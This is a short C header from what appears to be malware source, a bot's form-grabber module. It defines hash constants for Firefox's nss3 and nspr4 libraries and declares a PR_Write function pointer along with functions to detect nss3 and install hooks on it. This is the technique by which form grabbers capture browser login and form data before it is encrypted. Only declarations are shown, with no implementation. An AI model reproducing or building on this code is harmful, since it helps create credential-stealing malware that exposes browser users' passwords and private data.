#pragma once
#include "modules.h"

#ifdef MODULE_FORMGRABBER
#include "../common/bot_structs.h"

#define HASH_NSS3 0x74479de0
#define HASH_NSPR4 0xeb74cd2b

typedef int(__cdecl *pt_PRWrite)(void *fd, const void *buf, __int32 amount);

BOOL WINAPI IsNss3(HMODULE* phMod);
BOOL WINAPI InstallNss3Hooks();
#endif